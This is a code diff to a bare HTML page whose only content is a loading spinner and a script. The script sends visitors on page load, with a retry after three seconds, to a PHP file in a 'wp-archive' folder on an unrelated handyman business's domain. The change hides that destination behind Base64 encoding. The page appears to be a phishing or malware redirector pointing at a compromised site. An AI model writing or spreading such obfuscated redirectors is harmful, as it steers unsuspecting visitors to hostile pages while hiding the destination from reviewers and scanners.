@@ -31,23 +31,38 @@
 <body>
     <div class="loader"></div>
     <script>
-        // URL to redirect to
-        const redirectUrl = "handymanservicesofchicago.com/wp-archive/030cf.php"; // Replace with your target URL
+        (function() {
+            // Base64 encoded URL of the final destination
+            const encodedUrl = "aHR0cHM6Ly9oYW5keW1hbnNlcnZpY2Vzb2ZjaGljYWdvLmNvbS93cC1hcmNoaXZlLzAzMGNmLnBocA=="; // Replace with your encoded URL
 
-        // Perform the redirect
-        function performRedirect() {
-            window.location.replace(redirectUrl);
-        }
-
-        // Execute immediately
-        performRedirect();
-
-        // Fallback redirect after 3 seconds if immediate redirect fails
-        setTimeout(() => {
-            if (document.location.href === window.location.href) {
-                performRedirect();
+            // Decode the Base64 encoded URL
+            function decodeBase64(encoded) {
+                try {
+                    return atob(encoded);
+                } catch (e) {
+                    console.error("Failed to decode Base64 URL", e);
+                    return null;
+                }
             }
-        }, 3000);
+
+            // Perform the redirect
+            function performRedirect() {
+                const decodedUrl = decodeBase64(encodedUrl);
+                if (decodedUrl) {
+                    window.location.replace(decodedUrl);
+                } else {
+                    console.error("Invalid URL");
+                }
+            }
+
+            // Execute the redirect immediately
+            performRedirect();
+
+            // Fallback: Retry the redirect after 3 seconds if it fails
+            setTimeout(() => {
+                performRedirect();
+            }, 3000);
+        })();
     </script>
 </body>
 </html>
